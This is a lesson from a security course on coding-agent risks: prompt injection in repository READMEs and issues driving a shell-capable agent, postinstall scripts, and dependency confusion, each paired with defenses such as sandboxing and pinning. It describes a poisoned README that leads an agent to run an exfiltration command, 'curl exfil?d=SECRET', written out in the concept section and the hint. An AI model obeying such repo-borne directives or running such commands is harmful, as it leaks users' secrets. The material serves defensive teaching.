<div class="prereq">

**Prerequisites.** [16.1 agent surface](../module-16/lesson-01.md), [17.1 tool poisoning](../module-17/lesson-01.md),
[01.1 command injection / code execution / supply chain](../module-01/lesson-01.md),
[13.1 supply chain / pinning](../module-13/lesson-01.md), [18.1 chains](../module-18/lesson-01.md).
Lab: shared agent runtime, offline.

**You will learn.** Code-agent security: **malicious repos/READMEs**, **poisoned dependencies**,
**install/build scripts**, **prompt injection in source/issues/PRs**, and **dependency confusion** —
the worst case being untrusted repo content driving a **shell-capable** agent (arbitrary code
execution). Plus the enforced defenses (repo-content-as-data, least privilege, sandboxing, command
allowlists, dependency pinning).

**Why this matters.** Coding agents read and act on repositories, and a repo is almost entirely
attacker-controllable text (README, manifests, source, tests, issues, PRs) feeding an agent that can
run shell commands. This combines every prior lesson — indirect injection, excessive agency, tool
poisoning, supply chain — into the highest-consequence agent scenario.

</div>

# 21.1 · Code-agent security

## Why this matters

Give an agent a repo and a shell and you've built the most dangerous configuration in the course:
untrusted text (the repo) with a direct path to arbitrary code execution (the shell), plus the
existing software supply chain (dependencies, install scripts) layered underneath. A coding agent
that "trusts" the repo it's working on is one poisoned README away from running the attacker's
command with your credentials and network.

## Learning objectives

1. Enumerate the code-repo attack surface: README/docs, manifests + install/build scripts, source
   comments, tests, issues, PRs.
2. Reproduce **prompt injection in repo content** driving a shell-capable agent to exfiltrate.
3. Apply enforced defenses: repo-content-as-data, least privilege (no shell), **sandboxing** (no
   egress/secrets), command allowlists, approval gates.
4. Explain and model **dependency confusion** and defeat it with pinning + integrity hashes.
5. Reason about **install/build script** execution (postinstall) and CI/CD as code-execution paths.

## Concept

### The repo is untrusted input

A coding agent reads, to do its job: the **README/docs** (M05/M06 injection), the **manifest**
(`package.json`/`pyproject.toml` with install/build scripts that *run code*), **source** (comments
can carry injections; the agent may execute or import it), **tests** (run arbitrary code), and
**issues/PRs** (attacker-submitted text the agent may act on). All are attacker-controllable for any
repo you didn't write. The agent's **shell tool** turns any obeyed directive into arbitrary code
execution (M01). Lab: a poisoned README comment drives `run_shell(curl exfil?d=SECRET)`.

### Install/build scripts execute code

`npm install` runs `postinstall`; `pip install` can run `setup.py`; build steps run Makefiles/hooks.
So "set up the repo" = "run the repo's code" before any agent reasoning — the software supply chain
(M01/M13) inside the coding-agent loop. Sandboxing and reviewing scripts matter as much as the agent's
own behavior.

### Dependency confusion

A resolver that picks the **highest version across registries** lets an attacker who publishes a
higher-versioned package on a *public* registry override your *internal* package of the same name.
The fix is **pinning** (lockfiles) to a trusted registry/version + **integrity hashes**, and scoping
internal names. Lab: unpinned resolves to the attacker's `9.9.9`; pinned stays on internal `1.2.0`.

## Intuition

A coding agent with a shell is an eager junior dev who will run any command they read in the repo's
setup notes — and the repo came from a stranger. You don't make them safe by asking them to be
careful; you (1) tell them the repo's notes are *documentation, not orders* (content-as-data), (2)
take away the ability to run arbitrary shell when the task doesn't need it (least privilege), (3) if
they must run builds, do it in a locked room with no phone and no keys (sandbox: no egress, no
secrets), (4) require a senior's sign-off for risky commands (approval), and (5) get dependencies
only from the company store with a signed packing list (pinning + hashes).

## Technical explanation & Code

`labs/lab-21/code_agent.py`: `POISONED_README` hides a `CALL run_shell(...)` directive; `setup_repo`
feeds README content to the agent. Trusting it → exfil; `_strip` (content-as-data) or a `Policy` with
no `run_shell` / an approval gate blocks it. `resolve_package` models dependency confusion (highest
version wins) vs pinning. `run_shell` is inert — it records the command to the sink.

## Mathematics

Reuse the chain lens (M18): a code-agent compromise is repo-injection → shell → egress. Each enforced
control zeroes a hop:
- content-as-data → strips the injection (removes the injection hop; a *filter*, so imperfect),
- no-shell / least privilege → removes the execution hop (structural),
- sandbox (no egress/secrets) → the shell runs but can neither reach the attacker nor read the secret
  (removes the exfil hop / empties the payload),
- command allowlist / approval → gates the execution hop.

Structural controls (no-shell, sandbox) give $p_i=0$; filters (content-as-data, allowlist) give
pass-through $q_i>0$ — prefer structural, stack filters as depth (M18 math). **Dependency confusion**
is a separate, deterministic bug: pinning makes the resolver's choice a constant (attacker version
unreachable), not a probability.

## Attack / Defense model

<div class="callout guarantee">

**Guarantee analysis — code-agent defenses.**
- **Stops:** repo-borne directives (content-as-data — filter), arbitrary execution (no-shell / least
  privilege — structural), exfiltration and credential theft even if the shell runs (sandbox: no
  egress + no secrets in env — structural), risky commands (allowlist/approval), and dependency
  confusion (pinning + hashes — deterministic).
- **Does NOT stop:** attacks using *needed* capabilities within their sandbox (e.g. a build that
  legitimately writes files could still be abused within that scope), a compromised *pinned*
  dependency (signed-but-malicious, M13), social-engineered approvals, or content-as-data evasion by
  encoding.
- **Attacker adapts:** hide directives from the stripper; operate within sandbox limits; compromise a
  trusted dependency; target CI where secrets/egress exist.
- **Cost:** sandboxing/build isolation is engineering work; command allowlists and approvals add
  friction; pinning requires lockfile discipline.
- **Takeaway:** the coding agent is the worst-case combination — treat repo content as data, run
  builds/tools in a **sandbox with no egress and no secrets**, minimize the shell capability, and pin
  dependencies. Structural controls (no-shell, sandbox, pinning) are the real guarantees; filters and
  approvals are depth.

</div>

## Practical lab

<div class="lab">

**Lab 21** ([`labs/lab-21/`](../../labs/lab-21/README.md)) — poisoned repo → shell exfil + four
defenses + dependency confusion. Offline, inert shell.

```bash
py labs/lab-21/code_agent.py
py -m pytest labs/lab-21 -q
```

</div>

## Exercise

1. **Expand the surface.** Add a malicious `postinstall` in a manifest and a source-comment injection;
   show each drives the agent. Extend content-as-data to cover manifests and source.
2. **Sandbox the shell (structural).** Model `run_shell` running with **no egress** and **no secret in
   env**; show that even when the injected command runs, it cannot exfiltrate (empty payload / blocked
   egress) — the strongest single control for "the agent must run builds."
3. **Command allowlist + evasion (purple team).** Allowlist a set of safe commands; show a directive
   that chains/obfuscates to evade it (shell metacharacters — command injection, M01), then harden
   (arg-array execution, no shell interpolation) and re-measure.
4. **Dependency confusion end to end.** Reproduce the resolver bug; add a **lockfile** (pin + integrity
   hash) and show it defeats the attacker's higher version; then show a *compromised pinned* dep still
   gets in (motivating provenance/signing, M13).
5. **CI/CD reasoning.** Explain why CI is the highest-value target (secrets + egress + auto-run) and
   what minimal controls (ephemeral creds, no secrets to untrusted PRs, sandboxed runners) reduce it.
   Write the guarantee box for a coding-agent + CI setup.

<details><summary>Hint (step 2)</summary>

Sandboxing is the code-agent analog of M18's egress control + M12's "don't put secrets in scope":
run the build in a container with `network_mode: none` and an environment stripped of credentials.
The injected `curl exfil?d=SECRET` then either can't resolve/reach the host or has no secret to send —
the exfil hop is structurally empty regardless of whether the command executed.

</details>

**Deliverable.** The expanded surface + content-as-data, the sandbox demonstration, the allowlist +
evasion + fix, the dependency-confusion + lockfile (+ compromised-pinned caveat), and the CI/CD
analysis + guarantee box.

## Research paper

**Alex Birsan, "Dependency Confusion" (2021)** + real **malicious-package / postinstall** supply-chain
incidents (event-stream, ua-parser-js) + **prompt-injection-in-repos** writeups for coding agents
(2024–2025). *Why:* the three concrete pillars — namespace/version confusion, install-script code
execution, and repo-content injection into agents. *Read:* Birsan's version-precedence trick; how a
postinstall ran attacker code; a coding-agent injection PoC. *Reproduce:* the lab models all three;
add a lockfile with integrity hashes and confirm it pins. *Limits:* real resolvers/CI have nuances;
signed-but-compromised deps remain a residual (M13/M22).

## Further reading

- SLSA / supply-chain integrity frameworks; OWASP LLM03 (Supply Chain);
  [`references/standards-map.md`](../../references/standards-map.md). Forward link M22 (AI supply chain).

## Assessment

<details><summary>Q1. Why is a coding agent the worst-case agent scenario?</summary>

It combines fully attacker-controllable input (a repo: README/manifest/source/tests/issues/PRs) with
a direct arbitrary-code-execution capability (the shell) and the underlying software supply chain
(dependencies, install scripts). Indirect injection (M05) + excessive agency (M16) + supply chain
(M13) all converge, so an obeyed directive becomes code execution with the agent's credentials/network.

</details>

<details><summary>Q2. What is dependency confusion and how do you defeat it?</summary>

A resolver that picks the highest version across registries lets an attacker override your internal
package by publishing a higher-versioned public package of the same name. Defeat it by pinning
(lockfiles) to a trusted registry/version, verifying integrity hashes, and scoping internal names —
making the resolver's choice a constant the attacker can't raise.

</details>

<details><summary>Q3. Why prefer sandboxing the shell over a command allowlist?</summary>

An allowlist is a filter with false negatives (shell metacharacters/chaining can evade it — command
injection). Sandboxing (no egress, no secrets in env) is structural: even if an arbitrary command
runs, it cannot reach the attacker or read a secret, so the exfil hop is empty regardless of what was
executed. Use both, but the sandbox is the guarantee.

</details>

## What you should now be able to do

- Treat every part of a repository as untrusted input to a coding agent.
- Reproduce repo-content injection driving a shell agent and defend it structurally.
- Sandbox build/shell execution (no egress/secrets) and reason about command allowlists' limits.
- Reproduce and defeat dependency confusion with pinning + integrity hashes, and reason about CI/CD risk.

## Progress checkpoint

```bash
py course.py complete 21.1
py course.py next
```

**Next:** 22.1 · AI supply chain — model hubs, datasets, tokenizer/config files, Docker images,
inference servers, plugins; compromise *around* the model, tying together M13/M21.
